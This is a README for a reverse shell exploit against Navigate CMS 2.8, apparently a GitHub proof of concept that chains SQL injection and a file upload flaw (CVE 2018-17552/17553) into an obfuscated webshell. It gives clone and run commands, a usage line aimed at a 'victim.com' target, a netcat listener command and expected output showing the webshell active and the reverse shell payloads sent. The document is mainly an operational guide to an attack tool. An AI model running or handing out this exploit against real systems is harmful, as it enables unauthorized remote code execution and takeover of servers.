# Navigate CMS 2.8 Remote Code Execution Exploit

![Security](https://img.shields.io/badge/Security-Exploit-red)
![Platform](https://img.shields.io/badge/Platform-Linux-blue)
![Language](https://img.shields.io/badge/Language-Bash-green)

A proof-of-concept exploit for Navigate CMS 2.8 that demonstrates a remote code execution vulnerability leading to reverse shell access.

## 📖 Overview

This exploit demonstrates CVE 2018-17552 and CVE 2018-17553 vulnerability chain in Navigate CMS version 2.8, featuring:

- **SQL Injection** in authentication mechanism
- **Unrestricted File Upload** vulnerability
- **Remote Code Execution** via obfuscated webshell
- **Multiple Reverse Shell** payload delivery methods

## 📦 Installation

```bash
# Clone the repository
git clone https://github.com/adrianmafandy/Navigate-CMS-RCE.git
cd Navigate-CMS-RCE

# Make the script executable
chmod +x navigate_rce.sh
```
## 🚀 Usage
Basic Syntax:
```bash
./navigate_rce.sh <target_url> <your_ip> <your_port>
```
Example:
```bash
./navigate_rce.sh http://victim.com 192.168.1.100 1337
```
Start a netcat listener before running the exploit:
```bash
nc -lvnp 1337
```
Expected Output:
```bash
 ______
(_____ \
 _____) ) _ _ ____   ____ ___   ____
|  ____/ | | |  _ \ / ___) _ \ / _  |
| |    | | | | | | | |  | |_| ( (_| |
|_|     \___/|_| |_|_|   \___/ \___ |
                              (_____|
   Navigate CMS 2.8 RCE by dr14n

[*] Getting session...
[+] Session: abcdefvckyou
[*] Creating webshell...
[*] Uploading webshell...
[*] Verifying webshell...
[+] Webshell active: http://victim.com/navigate/navigate_info.php
[*] Sending reverse shell payloads...
[+] Reverse shell payloads sent!
[+] Check your listener for connections
```
